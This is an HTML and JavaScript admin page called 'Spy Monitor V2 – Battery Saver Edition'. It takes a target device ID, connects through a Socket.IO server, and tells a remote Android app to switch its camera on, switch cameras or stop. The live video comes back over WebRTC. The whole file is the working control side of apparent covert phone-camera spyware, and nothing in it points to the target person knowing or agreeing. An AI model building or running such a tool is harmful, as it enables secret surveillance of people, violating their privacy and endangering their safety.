<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Admin Panel - Battery Saver Mode</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
    <style>
        /* --- DARK THEME UI --- */
        body {
            margin: 0; padding: 0;
            background-color: #121212;
            color: white;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .phone-frame {
            position: relative;
            width: 100%; height: 100%;
            max-width: 500px;
            background: #000;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            border-left: 1px solid #333;
            border-right: 1px solid #333;
        }

        /* Top Header */
        .top-bar {
            padding: 15px;
            background: #1f1f1f;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            z-index: 10;
        }

        .status-badge {
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
            background: #444;
            color: #aaa;
        }
        .status-badge.live { background: #00C851; color: white; }
        .status-badge.error { background: #ff4444; color: white; }

        /* Video Area */
        .video-container {
            flex-grow: 1;
            position: relative;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%; height: 100%;
            object-fit: contain;
            transform: scaleX(-1); /* Mirror effect */
        }

        /* Placeholder when video is off */
        .video-placeholder {
            position: absolute;
            color: #555;
            text-align: center;
        }
        .video-placeholder i { font-size: 40px; margin-bottom: 10px; display: block; }

        /* Bottom Controls */
        .controls-panel {
            background: #1f1f1f;
            padding: 20px;
            display: flex;
            justify-content: space-around;
            align-items: center;
            border-top: 1px solid #333;
        }

        .btn {
            border: none;
            border-radius: 50px;
            padding: 12px 20px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: transform 0.1s;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .btn:active { transform: scale(0.95); }

        .btn-start { background: #00C851; color: white; width: 30%; justify-content: center; }
        .btn-stop { background: #ff4444; color: white; width: 30%; justify-content: center; }
        .btn-switch { background: #33b5e5; color: white; width: 20%; justify-content: center; padding: 12px; }

        /* Login Overlay */
        #login-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #000;
            z-index: 100;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        input {
            padding: 12px; margin-bottom: 15px;
            border-radius: 8px; border: 1px solid #333;
            background: #222; color: white; text-align: center; width: 70%;
        }

    </style>
</head>
<body>

    <div class="phone-frame">
        
        <div id="login-overlay">
            <h2>Spy Monitor V2</h2>
            <p style="color:#666; font-size:12px; margin-bottom:20px;">BATTERY SAVER EDITION</p>
            <input type="text" id="targetId" placeholder="Enter Device ID">
            <button class="btn btn-start" style="width:50%" onclick="connectSystem()">CONNECT</button>
        </div>

        <div class="top-bar">
            <div id="status" class="status-badge">Waiting...</div>
            <div style="font-size:12px; color:#666;" id="deviceIdDisplay">ID: --</div>
        </div>

        <div class="video-container">
            <div id="placeholder" class="video-placeholder">
                <div>üì∑</div>
                <span>Camera is OFF</span>
            </div>
            <video id="remoteVideo" autoplay playsinline muted></video>
        </div>

        <div class="controls-panel">
            <button class="btn btn-start" onclick="sendCommand('start')">‚ñ∂ START</button>
            <button class="btn btn-switch" onclick="sendCommand('switch')">üîÑ</button>
            <button class="btn btn-stop" onclick="sendCommand('stop')">‚èπ STOP</button>
        </div>

    </div>

    <script>
        const SOCKET_URL = "https://child-v9no.onrender.com"; 
        let socket;
        let peerConnection;
        let targetDeviceId = "";

        const config = {
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        };

        // Load saved ID
        window.onload = () => {
            const saved = localStorage.getItem("savedDeviceId");
            if(saved) document.getElementById("targetId").value = saved;
        }

        function connectSystem() {
            const id = document.getElementById("targetId").value.trim();
            if(!id) return alert("Please enter Device ID");
            
            targetDeviceId = id;
            localStorage.setItem("savedDeviceId", id);
            document.getElementById("deviceIdDisplay").innerText = "ID: " + id;
            document.getElementById("login-overlay").style.display = "none";

            initSocket();
        }

        function initSocket() {
            socket = io(SOCKET_URL);

            socket.on("connect", () => {
                updateStatus("System Connected (Idle)", false);
                socket.emit("join-room", "ADMIN");
            });

            // üì° VIDEO OFFER RECEIVED
            socket.on("offer", async (data) => {
                console.log("üì° Receiving Video Feed...");
                document.getElementById("placeholder").style.display = "none"; // Hide placeholder
                updateStatus("üî¥ LIVE STREAMING", true);
                
                createPeerConnection();
                await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);
                
                socket.emit("answer", { target: targetDeviceId, type: "answer", sdp: answer.sdp });
            });

            socket.on("candidate", async (data) => {
                if (peerConnection) {
                    await peerConnection.addIceCandidate(new RTCIceCandidate(data));
                }
            });
        }

        // üî• MAIN CONTROL FUNCTION
        function sendCommand(action) {
            if(!socket || !socket.connected) return alert("Server not connected!");

            if(action === 'start') {
                updateStatus("Requesting Camera...", false);
                // Android App ko bolega: Camera Kholo
                socket.emit('send-command', { targetId: targetDeviceId, command: "start_video" });
            } 
            
            else if(action === 'stop') {
                updateStatus("Stopping...", false);
                document.getElementById("placeholder").style.display = "block"; // Show placeholder
                document.getElementById("remoteVideo").srcObject = null; // Clear video
                
                if(peerConnection) {
                    peerConnection.close();
                    peerConnection = null;
                }
                // Android App ko bolega: Camera Band karo & Battery bachao
                socket.emit('send-command', { targetId: targetDeviceId, command: "stop_video" });
                
                setTimeout(() => updateStatus("Camera Stopped", false), 1000);
            } 
            
            else if(action === 'switch') {
                // Button rotate animation
                const btn = document.querySelector('.btn-switch');
                btn.style.transform = "rotate(180deg)";
                setTimeout(() => btn.style.transform = "rotate(0deg)", 300);
                
                socket.emit("switch-camera", { target: targetDeviceId });
            }
        }

        function createPeerConnection() {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(config);

            peerConnection.ontrack = (event) => {
                const video = document.getElementById("remoteVideo");
                video.srcObject = event.streams[0];
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", {
                        target: targetDeviceId,
                        type: "candidate",
                        candidate: event.candidate.candidate,
                        sdpMid: event.candidate.sdpMid,
                        sdpMLineIndex: event.candidate.sdpMLineIndex
                    });
                }
            };
        }

        function updateStatus(text, isLive) {
            const el = document.getElementById("status");
            el.innerText = text;
            el.className = isLive ? "status-badge live" : "status-badge";
        }
    </script>
</body>
</html>
